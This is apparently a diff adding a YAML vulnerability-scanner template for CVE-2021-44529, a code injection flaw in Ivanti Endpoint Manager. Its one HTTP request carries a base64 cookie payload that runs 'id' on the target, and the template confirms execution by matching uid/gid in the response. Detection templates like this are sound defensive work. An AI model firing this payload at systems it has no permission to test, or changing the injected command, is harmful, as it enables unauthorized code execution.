@@ -1,0 +1,36 @@
+id: cve-2021-44529
+info:
+  name: Ivanti Endpoint Manager Code Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ivanti Endpoint Manager (EPM) contains a code injection vulnerability in `index.php` that allows an unauthenticated user to execute arbitrary code with limited privileges.
+  classification:
+    cve-id: CVE-2021-44529
+    cvss-score: 9.8
+  tags: code-execution,critical
+http:
+  - raw:
+      - |
+        GET /client/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: ab=ab; c=c3lzdGVtKCJpZCIpOw==; d=; e=;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+    extractors:
+      - type: regex
+        name: user-id
+        regex:
+          - "uid=([0-9]+)"
+      - type: regex
+        name: group-id
+        regex:
+          - "gid=([0-9]+)"
